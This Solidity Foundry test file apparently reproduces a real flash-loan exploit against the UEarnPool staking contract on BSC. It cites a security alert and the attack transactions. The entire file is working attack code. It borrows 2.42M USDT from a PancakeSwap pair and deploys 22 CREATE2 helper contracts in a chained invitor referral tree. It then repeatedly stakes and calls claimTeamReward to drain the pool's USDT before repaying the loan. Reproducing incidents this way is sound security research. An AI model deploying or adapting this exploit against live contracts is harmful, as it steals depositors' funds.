// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/CertiKAlert/status/1593094922160128000
// @Tx
// https://bscscan.com/tx/0xb83f9165952697f27b1c7f932bcece5dfa6f0d2f9f3c3be2bb325815bfd834ec
// https://bscscan.com/tx/0x824de0989f2ce3230866cb61d588153e5312151aebb1e905ad775864885cd418

interface UEarnPool{
    function bindInvitor(address invitor) external;
    function stake(uint256 pid, uint256 amount) external;
    function claimTeamReward(address account) external;
}

contract claimReward{
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function bind(address invitor) external{
        Pool.bindInvitor(invitor);
    }
    function stakeAndClaimReward(uint256 amount) external{
        USDT.approve(address(address(Pool)), type(uint).max);
        Pool.stake(0, amount);
        Pool.claimTeamReward(address(this));
    }
    function withdraw(address receiver) external{
        USDT.transfer(receiver, USDT.balanceOf(address(this)));
    }
}

contract ContractTest is DSTest{
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address[] contractList;
    
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheat.createSelectFork("bsc", 23120167);
    }

    function testExploit() public{
        contractFactory();
        // bind invitor
        (bool success, ) = contractList[0].call(abi.encodeWithSignature("bind(address)", tx.origin));
        require(success);
        for(uint i = 1; i < 22; i++){
            (bool success, ) = contractList[i].call(abi.encodeWithSignature("bind(address)", contractList[i - 1]));
            require(success);
        }

        Pair.swap(2_420_000 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),
            18
        );

    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        uint len = contractList.length;
        // teamAmount > 2_400_000
        USDT.transfer(contractList[len - 1], 2_400_000 * 1e18);
        (bool success1, ) = contractList[len - 1].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 2_400_000 * 1e18));
        require(success1);
        for(uint i = len - 2; i > 4; i--){
            USDT.transfer(contractList[i], 20_000 * 1e18);
            USDT.balanceOf(address(this));
            // 162000 - 20000 + 1500
            if(USDT.balanceOf(address(Pool)) < 143_500 * 1e18){
                USDT.transfer(address(Pool), 143_500 * 1e18 - USDT.balanceOf(address(Pool)));
            }
            (bool success1, ) = contractList[i].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 20_000 * 1e18)); // amount > 20_000
            require(success1);
            (bool success2, ) = contractList[i].call(abi.encodeWithSignature("withdraw(address)", address(this)));
            require(success2);
        }
        contractList[0].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[1].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[2].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[3].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[4].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        USDT.balanceOf(address(Pool));
        uint borrowAmount = 2_420_000 * 1e18;
        USDT.transfer(address(Pair), borrowAmount * 10000 / 9975 + 1000);
    }

    function contractFactory() public{
        address _add;
        bytes memory bytecode = type(claimReward).creationCode;
        for(uint _salt = 0; _salt < 22; _salt++){
            assembly{
                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
            }
            contractList.push(_add);
        }
    }


}